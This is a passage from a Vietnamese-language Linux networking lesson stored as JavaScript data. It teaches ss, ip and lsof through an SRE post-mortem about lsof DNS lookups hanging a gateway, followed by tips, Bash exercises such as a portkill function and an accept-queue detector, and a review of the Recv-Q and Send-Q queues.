          <p class="net-step-desc">Gửi tín hiệu dừng tiến trình và dùng lại <code>ss</code> để xác nhận cổng 7070 đã hoàn toàn sạch bóng:</p>
          <pre class="code-pre"><code>sudo kill -15 $TARGET_PID 2&gt;/dev/null || sudo kill -9 $TARGET_PID 2&gt;/dev/null
sleep 1
sudo ss -tulpn '( sport = :7070 )'</code></pre>
          <div class="net-verify-box">
            <span class="net-verify-icon">✓</span>
            <span><strong>Thành công mỹ mãn:</strong> Lệnh <code>ss</code> không còn trả về bất kỳ dòng nào! Cổng 7070 đã được giải phóng hoàn toàn, sẵn sàng cho ứng dụng mới triển khai.</span>
          </div>
        </div>`
        },
        {
          id: "sec-production",
          title: "Môi trường Production & Ca sự cố: Bệnh án 'Treo Hệ Thống Vì Chẩn Đoán' (DNS Outage Cascade)",
          content: `<div class="net-postmortem-card">
          <div class="net-postmortem-header">
            <span class="net-postmortem-badge">SRE POST-MORTEM</span>
            <span class="net-postmortem-title">Hồ Sơ Sự Cố: Lệnh lsof Làm Treo Cứng Gateway Khi DNS Nội Bộ Sập</span>
          </div>
          <div class="net-postmortem-body">
            <p><strong>🚨 Bối cảnh sự cố:</strong> Tại một trung tâm dữ liệu lớn, cụm máy chủ API Gateway (Nginx gánh hơn 60.000 kết nối đồng thời) bất ngờ ghi nhận tỷ lệ lỗi tăng cao do một switch mạng nội bộ bị sập nguồn, kéo theo cụm máy chủ Core DNS nội bộ (Bind9/CoreDNS) bị mất kết nối hoàn toàn.</p>
            <p>Một kỹ sư trực ban (On-call) vội vàng SSH vào máy chủ Gateway để điều tra và gõ lệnh theo thói quen cũ:</p>
            <div class="net-log-terminal">$ sudo lsof -i
(Con trỏ nhấp nháy... Terminal bị đơ hoàn toàn không phản hồi!)
(Kỹ sư nhấn Ctrl+C, Ctrl+Z nhưng không có tác dụng!)</div>

            <p style="margin-top:12px;"><strong>💥 Thảm họa dây chuyền (Cascading Failure):</strong></p>
            <ul>
              <li>Không chỉ terminal của kỹ sư bị treo, mà CPU của máy chủ Gateway đột ngột vọt lên <strong>100%</strong>! Hàng loạt kết nối của khách hàng đang hoạt động bình thường bắt đầu bị đứt gãy.</li>
              <li>Tại sao một lệnh chẩn đoán tưởng như vô hại là <code>lsof -i</code> lại có thể "hạ gục" một máy chủ tải cao?</li>
            </ul>

            <p><strong>🔍 Phân tích nguyên nhân gốc rễ (Root Cause Analysis):</strong></p>
            <ol>
              <li><strong>Hành vi mặc định tai hại của lsof:</strong> Khi chạy <code>lsof -i</code> mà không có cờ <code>-n</code>, <code>lsof</code> tự động gửi một truy vấn phân giải ngược DNS (Reverse DNS Lookup: PTR record) cho từng địa chỉ IP của toàn bộ 60.000 socket đang mở!</li>
              <li><strong>Hiệu ứng tuyết lở (DNS Timeout Avalanche):</strong> Vì cụm DNS server đã chết, mỗi truy vấn DNS phải đợi hết thời gian timeout (mặc định là 5 giây trong <code>/etc/resolv.conf</code>). Với 60.000 socket, <code>lsof</code> cố gắng tạo ra hàng vạn truy vấn DNS dồn dập vào hàng đợi UDP của Kernel, làm cạn kiệt bộ nhớ đệm và chiếm trọn CPU, biến một sự cố mất kết nối mạng cục bộ thành thảm họa sập toàn bộ cổng API Gateway!</li>
            </ol>

            <p style="margin-top:14px;"><strong>💊 Phác đồ điều trị triệt để của Kiến trúc sư SRE:</strong></p>
            <ol class="net-treatment-list">
              <li>
                <strong>Cấu hình bí danh (Alias) an toàn vĩnh viễn trên toàn bộ máy chủ:</strong>
                <p style="margin:4px 0;font-size:0.86rem;">Thêm vào tệp <code>/etc/profile.d/safe_net_tools.sh</code> để bảo vệ mọi kỹ sư khỏi thói quen nguy hiểm:</p>
                <pre class="code-pre" style="margin:6px 0;"><code># Bắt buộc chế độ Numeric cho lsof và ss
alias lsof='lsof -nP'
alias ss='ss -n'</code></pre>
              </li>
              <li>
                <strong>Luôn đặt ngưỡng Timeout bảo vệ khi chạy lệnh chẩn đoán:</strong>
                <pre class="code-pre" style="margin:6px 0;"><code># Nếu lệnh chạy quá 3 giây, tự động hủy bỏ ngay lập tức
timeout 3s lsof -nP -i :8080</code></pre>
              </li>
              <li>
                <strong>Ưu tiên tuyệt đối ss thay vì lsof khi đo đạc tải cao:</strong>
                <p style="margin:4px 0;font-size:0.86rem;">Lệnh <code>ss -ntulp</code> giao tiếp qua Netlink nhị phân trực tiếp với Kernel, không bao giờ đọc đĩa và không bao giờ thực hiện DNS lookup khi có cờ <code>-n</code>, an toàn 100% trên các máy chủ hàng trăm ngàn kết nối.</p>
              </li>
            </ol>
          </div>
        </div>`
        }
      ],
      callouts: {
        pitfalls: [
          {
            title: "Bẫy hiểu nhầm Recv-Q và Send-Q trong lệnh ss (LISTEN vs ESTABLISHED)",
            content: "Đừng bao giờ quên: Trong trạng thái <code>LISTEN</code>, <code>Recv-Q</code> là số kết nối đang xếp hàng chờ ứng dụng <code>accept()</code>, còn <code>Send-Q</code> là kích thước tối đa của hàng đợi backlog! Nếu thấy <code>Recv-Q &gt; 0</code> trên một cổng LISTEN, ứng dụng của bạn đang bị nghẽn CPU hoặc deadlock không kịp phục vụ khách hàng. Ngược lại, trong trạng thái <code>ESTABLISHED</code>, chúng mới là số lượng byte dữ liệu chưa đọc và chưa ACK."
          },
          {
            title: "Bẫy 'chết chìm' trong phân giải DNS khi quên cờ -n và -P",
            content: "Không bao giờ gõ <code>lsof -i</code> hoặc <code>netstat</code> trần trụi trên máy chủ Production! Khi hệ thống mạng gặp sự cố, DNS thường là thành phần chết đầu tiên. Nếu thiếu cờ <code>-n</code> (No DNS) và <code>-P</code> (No Port Name), terminal của bạn sẽ bị treo cứng nhiều phút do hàng ngàn truy vấn DNS bị timeout."
          }
        ],
        tips: [
          {
            title: "Bật màu sắc trực quan cho terminal với cờ -c trong iproute2",
            content: "Hãy thử gõ lệnh: <code>ip -br -c a</code>. Cờ <code>-c</code> (Color) sẽ tự động tô màu xanh lá cây cho các card mạng <code>UP</code> và màu đỏ rực cho các card mạng <code>DOWN</code>, giúp bạn phát hiện sự cố đứt cáp chỉ trong một cái liếc mắt!"
          },
          {
            title: "Soi cấu trúc bộ nhớ RAM của Socket với ss -tm",
            content: "Thêm cờ <code>-m</code> (Memory) vào lệnh <code>ss -tm</code> để xem chính xác socket đó đang ngốn bao nhiêu byte RAM trong Kernel: <code>skmem:(r0,rb131072,t0,tb16384,f0,w0,o0,bl0)</code>. Đây là vũ khí tối mật khi điều tra sự cố rò rỉ bộ nhớ mạng (Kernel Socket Memory Leak)."
          }
        ]
      },
      exercises: [
        {
          level: "Dễ",
          title: "Tìm toàn bộ card mạng đang UP và các cổng TCP đang LISTEN",
          problem: "Viết một chuỗi lệnh Bash hai dòng: Dòng 1 dùng `ip` hiển thị ngắn gọn các card mạng đang có trạng thái UP. Dòng 2 dùng `ss` liệt kê danh sách các cổng TCP đang lắng nghe trên máy.",
          hint: "Kết hợp `ip -br a` với `grep UP`, và `ss -tln` với `grep LISTEN`.",
          solutionCode: "ip -br a | grep UP\nss -tln | grep LISTEN",
          solutionOutput: "eth0             UP             192.168.1.105/24 fe80::5054:ff:fe8a:bc11/64 \nLISTEN 0      128          0.0.0.0:22        0.0.0.0:*    \nLISTEN 0      128        127.0.0.1:8080      0.0.0.0:*",
          explanation: "Lệnh `ip -br a` cung cấp cái nhìn tổng quan tức thì về các interface UP. Lệnh `ss -tln` lọc chính xác các cổng TCP đang mở ở chế độ số (Numeric) mà không gây tốn tài nguyên hệ thống."
        },
        {
          level: "Vừa",
          title: "Viết hàm Bash portkill tự động giải phóng cổng mạng bị chiếm",
          problem: "Viết một hàm Bash function mang tên `portkill()` nhận tham số là số cổng (ví dụ `portkill 8080`), tự động dùng `lsof` tìm PID của tiến trình đang chiếm cổng và gửi tín hiệu SIGTERM (kill -15) để giải phóng cổng an toàn.",
          hint: "Dùng `lsof -t -nP -i :$1` để lấy mã PID dạng chuỗi số đơn giản.",
          solutionCode: "portkill() {\n  local port=\"$1\"\n  if [ -z \"$port\" ]; then echo \"Cần truyền số cổng: portkill <port>\"; return 1; fi\n  local pid=$(sudo lsof -t -nP -i :\"$port\")\n  if [ -n \"$pid\" ]; then\n    echo \"Tìm thấy PID $pid đang chiếm cổng $port. Đang dừng tiến trình...\"\n    sudo kill -15 $pid && echo \"Đã giải phóng cổng $port thành công!\"\n  else\n    echo \"Không có tiến trình nào đang chiếm cổng $port.\"\n  fi\n}",
          solutionOutput: "portkill 8080\nTìm thấy PID 4892 đang chiếm cổng 8080. Đang dừng tiến trình...\nĐã giải phóng cổng 8080 thành công!",
          explanation: "Cờ `-t` của `lsof` là bí quyết để biến output thành dạng Terse (chỉ trả về con số PID). Kết hợp với kiểm tra rỗng `[ -n \"$pid\" ]`, hàm hoạt động an toàn và tự động hóa việc dọn dẹp cổng bị kẹt."
        },
        {
          level: "Thử thách",
          title: "Viết công cụ phát hiện ứng dụng bị nghẽn Accept Queue (Slow Accept Detector)",
          problem: "Viết một đoạn script Bash quét toàn bộ các cổng TCP đang lắng nghe trên máy bằng `ss -lnt`, phân tích cột `Recv-Q` và `Send-Q`. Nếu phát hiện cổng nào có `Recv-Q > 0` (chứng tỏ có kết nối đang bị kẹt trong hàng đợi chưa được ứng dụng accept), lập tức in ra cảnh báo đỏ kèm tỷ lệ phần trăm lấp đầy của hàng đợi.",
          hint: "Dùng `awk` trên output của `ss -lnt`, so sánh `$2 > 0` (cột Recv-Q) và tính tỷ lệ `$2 / $3 * 100`.",
          solutionCode: "#!/bin/bash\necho \"Đang quét kiểm tra tình trạng nghẽn Accept Queue của các cổng dịch vụ...\"\nss -lnt | awk 'NR>1 && $2 > 0 {\n  recv = $2; send = $3;\n  pct = (send > 0) ? (recv / send * 100) : 100;\n  printf(\"🚨 BÁO ĐỘNG: Cổng %-21s bị nghẽn! Đang chờ: %d/%d (%.1f%% đầy hàng đợi)\\n\", $4, recv, send, pct);\n}'",
          solutionOutput: "🚨 BÁO ĐỘNG: Cổng 0.0.0.0:8080           bị nghẽn! Đang chờ: 4/5 (80.0% đầy hàng đợi)",
          explanation: "Trong output của `ss -lnt`, cột $2 là Recv-Q (kết nối đang chờ trong Accept Queue) và cột $3 là Send-Q (backlog tối đa). Nếu Recv-Q > 0, ứng dụng đang không theo kịp tốc độ kết nối của người dùng. Kỹ thuật này giúp các kỹ sư SRE phát hiện sớm các vụ sập server do nghẽn event-loop trước khi người dùng kịp phàn nàn!"
        }
      ],
      reflectionQuestion: "Tại sao trong output của lệnh ss -lnt (trạng thái LISTEN), cột Recv-Q và Send-Q lại mang ý nghĩa hoàn toàn khác biệt so với khi chạy ss -nt (trạng thái ESTABLISHED)? Thiết kế này của Linux Kernel phản ánh hai hàng đợi nào trong quá trình bắt tay 3 bước TCP (SYN Backlog vs Accept Queue)?",
      reflectionHint: "Thiết kế này phản ánh sự phân tách sâu sắc giữa hai giai đoạn của một kết nối TCP trong Linux Kernel:\n1. Khi Socket ở trạng thái LISTEN: Nó đóng vai trò là 'người đón khách'. Trong quá trình bắt tay 3 bước, Kernel duy trì 2 hàng đợi:\n   - SYN Queue (Incomplete Connection Queue): Chứa các kết nối client mới gửi SYN và Kernel đã gửi lại SYN-ACK, đang chờ ACK cuối.\n   - Accept Queue (Complete Connection Queue): Chứa các kết nối đã hoàn tất bắt tay 3 bước, chuyển sang ESTABLISHED nhưng ứng dụng phía User Space chưa gọi hàm accept() để nhận về. Cột Recv-Q chính là số kết nối đang nằm chờ trong Accept Queue này, còn Send-Q là kích thước tối đa của Accept Queue do tham số backlog trong syscall listen(fd, backlog) quy định!\n2. Khi Socket ở trạng thái ESTABLISHED: Nó đã là 'ống dẫn dữ liệu hai chiều độc quyền'. Lúc này Recv-Q và Send-Q quay về đúng nghĩa nguyên bản của bộ đệm dữ liệu: Recv-Q là số byte dữ liệu nằm trong RAM Kernel chưa được ứng dụng read(), còn Send-Q là số byte đã gửi nhưng chưa được đầu xa gửi ACK xác nhận.",
      summary: [
        "Bộ công cụ cũ net-tools (ifconfig, netstat, route) đã bị khai tử vì cơ chế ioctl chậm chạp, đọc file procfs gây lock CPU, và không hỗ trợ các công nghệ hiện đại như Network Namespaces.",
        "ip -br a là chân kiềng thứ nhất giúp kiểm tra hạ tầng card mạng (L1-L3), phân biệt rõ giữa cờ UP (ý muốn quản trị) và LOWER_UP (cáp mạng vật lý đã cắm).",
        "ss -tulpn là chân kiềng thứ hai khai thác Netlink sock_diag để soi socket tầng L4, cung cấp bức tranh chuẩn xác về cổng mở và các kết nối đang hoạt động.",
        "Trong trạng thái LISTEN của ss, Recv-Q thể hiện số kết nối đang bị kẹt trong Accept Queue và Send-Q là giới hạn backlog tối đa — đây là chỉ số cảnh báo sớm ứng dụng bị quá tải.",
        "lsof -nP -i là chân kiềng thứ ba giúp truy vết tận gốc PID, User và File Descriptor đang chiếm giữ socket; bắt buộc luôn dùng kèm cờ -n và -P để chống thảm họa treo terminal do DNS timeout."
      ],
      nextLessonPreview: "Giai đoạn 1: Bản chất mạng và phân tầng — Mở đầu với Bài 1.1: Vì sao mạng phải phân tầng? Bài toán chia sẻ đường truyền & Đóng gói dữ liệu."
    }
  ]
};